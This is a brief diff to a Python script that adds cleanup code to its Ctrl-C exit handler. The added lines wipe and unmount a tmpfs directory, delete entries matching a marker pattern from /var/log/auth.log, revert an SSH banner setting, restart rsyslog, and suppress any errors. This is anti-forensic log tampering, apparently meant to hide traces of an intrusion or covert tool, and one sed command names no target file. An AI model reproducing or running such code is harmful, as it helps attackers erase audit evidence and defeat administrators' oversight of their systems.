@@ -85,4 +85,12 @@ try:
 
 except KeyboardInterrupt:
     print("Bye")
+    try:
+        subprocess.call("rm -rf /tmp/tmpfs/*", shell=True)
+        subprocess.call("umount /tmp/tmpfs/", shell=True)
+        subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
+        subprocess.check_output("sed -i 's:Banner /tmp/tmpfs/issue.net:Banner none:g'", shell=True)
+        subprocess.check_output("/etc/init.d/rsyslog restart", shell=True);
+    except subprocess.CalledProcessError as e:
+        pass
     sys.exit()
